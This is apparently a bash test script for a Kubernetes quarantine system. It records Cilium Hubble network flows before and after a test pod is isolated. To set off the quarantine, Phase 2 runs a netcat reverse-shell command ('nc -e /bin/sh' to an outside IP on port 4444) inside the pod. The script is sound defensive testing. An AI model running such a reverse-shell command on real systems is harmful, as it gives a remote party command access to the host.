#!/usr/bin/env bash
# ==============================================================================
# ZTRE Hubble Flow Capture: Before/After Quarantine Network Evidence
# Captures Cilium Hubble flow logs showing traffic flowing pre-quarantine
# and being dropped post-quarantine.
# ==============================================================================
set -euo pipefail

OUTPUT_DIR="evidence/flows"
mkdir -p "$OUTPUT_DIR"

COLOR_GREEN="\033[0;32m"
COLOR_BLUE="\033[0;34m"
COLOR_YELLOW="\033[0;33m"
COLOR_RESET="\033[0m"
log_info()  { echo -e "${COLOR_BLUE}[INFO]${COLOR_RESET} $*"; }
log_pass()  { echo -e "${COLOR_GREEN}[DONE]${COLOR_RESET} $*"; }
log_warn()  { echo -e "${COLOR_YELLOW}[WARN]${COLOR_RESET} $*"; }

export PATH="$PATH:/usr/local/bin"

echo "======================================================================"
echo "    ZTRE Hubble Flow Capture: Network Isolation Evidence               "
echo "======================================================================"

# 0. Ensure Hubble relay is up and start a port-forward to it.
if ! kubectl get pods -n kube-system -l k8s-app=hubble-relay --no-headers 2>/dev/null | grep -q Running; then
    log_info "Hubble relay not running. Enabling..."
    cilium hubble enable --relay 2>/dev/null || true
    sleep 10
fi

pkill -f "port-forward.*hubble-relay" 2>/dev/null || true
sleep 1
kubectl port-forward -n kube-system svc/hubble-relay 4245:80 --address 127.0.0.1 >/tmp/hubble-pf.log 2>&1 &
PF_PID=$!
sleep 4

if ! timeout 10 hubble observe --server 127.0.0.1:4245 --last 1 >/dev/null 2>&1; then
    log_warn "Hubble relay not reachable on 127.0.0.1:4245 — aborting capture"
    kill $PF_PID 2>/dev/null || true
    exit 1
fi
log_pass "Hubble relay reachable"

HUBBLE="hubble observe --server 127.0.0.1:4245"

# 1. Ensure fresh test pod (not quarantined) and a database target
log_info "Setting up test target pod..."
kubectl delete pod flow-test -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true
sleep 2
kubectl run flow-test -n ztre-test --image=alpine --restart=Never \
    --labels="app=flow-test" \
    -- /bin/sh -c 'apk add --no-cache netcat-openbsd >/dev/null 2>&1; sleep 300'
kubectl wait --for=condition=Ready pod/flow-test -n ztre-test --timeout=90s >/dev/null 2>&1

DATABASE_IP=$(kubectl get pod -n ztre-test -l app=database -o jsonpath='{.items[0].status.podIP}' 2>/dev/null || echo "")
if [ -z "$DATABASE_IP" ]; then
    log_info "Database pod not found; deploying workloads..."
    kubectl apply -f deploy/workloads/postgres-backend.yaml >/dev/null 2>&1
    kubectl rollout status deployment/database -n ztre-test --timeout=90s >/dev/null 2>&1
    DATABASE_IP=$(kubectl get pod -n ztre-test -l app=database -o jsonpath='{.items[0].status.podIP}')
fi
log_info "Target database IP: $DATABASE_IP"

# 2. PHASE 1: pre-quarantine flows (baseline connectivity, expect FORWARDED)
log_info "PHASE 1: capturing pre-quarantine flows while generating baseline traffic..."

$HUBBLE --namespace ztre-test --pod flow-test --output json \
    > "$OUTPUT_DIR/pre-quarantine-flows.json" 2>/dev/null &
HUBBLE_PID=$!
sleep 2
for _ in 1 2 3; do
    kubectl exec -n ztre-test flow-test -- /bin/sh -c "nc -z -w 2 $DATABASE_IP 5432; echo status:\$?" 2>/dev/null || true
done
sleep 4
kill $HUBBLE_PID 2>/dev/null || true
wait $HUBBLE_PID 2>/dev/null || true

PRE_COUNT=$(grep -c . "$OUTPUT_DIR/pre-quarantine-flows.json" 2>/dev/null || echo 0)
log_pass "Pre-quarantine flows captured: ${PRE_COUNT} records"

# 3. Trigger attack -> quarantine
log_info "PHASE 2: triggering attack to quarantine flow-test pod..."
kubectl exec -n ztre-test flow-test -- /bin/sh -c 'nc -e /bin/sh 10.91.128.10 4444' >/dev/null 2>&1 || true
sleep 4

Q_LABEL=$(kubectl get pod flow-test -n ztre-test -o jsonpath='{.metadata.labels.ztre/quarantine}' 2>/dev/null || echo "")
if [ "$Q_LABEL" = "true" ]; then
    log_pass "Pod quarantined by ZTRE (ztre/quarantine=true)"
else
    log_warn "Pod not quarantined by agent; labeling manually for flow evidence"
    kubectl label pod flow-test -n ztre-test ztre/quarantine=true --overwrite >/dev/null 2>&1
fi

# 4. PHASE 3: wait for Cilium identity convergence, capture drops
# Cilium re-creates the endpoint security identity after the label patch;
# allow up to ~30s for the new identity to carry ztre/quarantine=true.
log_info "Waiting for Cilium eBPF identity convergence (up to 30s)..."
DB_CONNECTED=true
for i in $(seq 1 30); do
    if kubectl exec -n ztre-test flow-test -- /bin/sh -c "nc -z -w 1 $DATABASE_IP 5432; echo \$?" 2>/dev/null | grep -q '^1$'; then
        log_pass "Cilium denylist active: egress to database blocked after ${i}s"
        DB_CONNECTED=false
        break
    fi
    sleep 1
done
if [ "$DB_CONNECTED" = true ]; then
    log_warn "Egress still permitted after 30s — Cilium identity may not have converged"
fi

log_info "PHASE 3: capturing post-quarantine flows while retrying traffic (expect DROPPED)..."
$HUBBLE --namespace ztre-test --pod flow-test --output json \
    > "$OUTPUT_DIR/post-quarantine-drops.json" 2>/dev/null &
HUBBLE_PID=$!
sleep 2
for _ in 1 2 3; do
    kubectl exec -n ztre-test flow-test -- /bin/sh -c "nc -z -w 2 $DATABASE_IP 5432; echo status:\$?" 2>/dev/null || true
done
sleep 4
kill $HUBBLE_PID 2>/dev/null || true
wait $HUBBLE_PID 2>/dev/null || true

POST_COUNT=$(grep -c . "$OUTPUT_DIR/post-quarantine-drops.json" 2>/dev/null || echo 0)
log_pass "Post-quarantine flows captured: ${POST_COUNT} records"

# 5. Summarize verdicts
echo ""
echo "======================================================================"
echo "    Hubble Flow Capture Results                                        "
echo "======================================================================"
echo "  Pre-quarantine:   $OUTPUT_DIR/pre-quarantine-flows.json (${PRE_COUNT} records)"
echo "  Post-quarantine:  $OUTPUT_DIR/post-quarantine-drops.json (${POST_COUNT} records)"
echo ""
echo "  Verdict breakdown (pre):"
jq -r '.flow.verdict // "n/a"' "$OUTPUT_DIR/pre-quarantine-flows.json" 2>/dev/null | sort | uniq -c | sed 's/^/    /' || echo "    (jq unavailable)"
echo "  Verdict breakdown (post):"
jq -r '.flow.verdict // "n/a"' "$OUTPUT_DIR/post-quarantine-drops.json" 2>/dev/null | sort | uniq -c | sed 's/^/    /' || echo "    (jq unavailable)"
echo ""
DROPPED_COUNT=$(jq -r '.flow.verdict // ""' "$OUTPUT_DIR/post-quarantine-drops.json" 2>/dev/null | grep -c DROPPED || echo 0)
if [ "$DROPPED_COUNT" -gt 0 ]; then
    log_pass "Network-layer proof: ${DROPPED_COUNT} DROPPED flows captured post-quarantine"
else
    log_warn "No DROPPED verdicts captured; check Cilium identity convergence"
fi
echo "======================================================================"

# Save the raw text view too (human-readable evidence)
$HUBBLE --namespace ztre-test --pod flow-test --last 50 2>/dev/null \
    > "$OUTPUT_DIR/hubble-flow-summary.txt" || true

# 6. Cleanup
kubectl delete pod flow-test -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true
kill $PF_PID 2>/dev/null || true
log_pass "Cleanup complete"
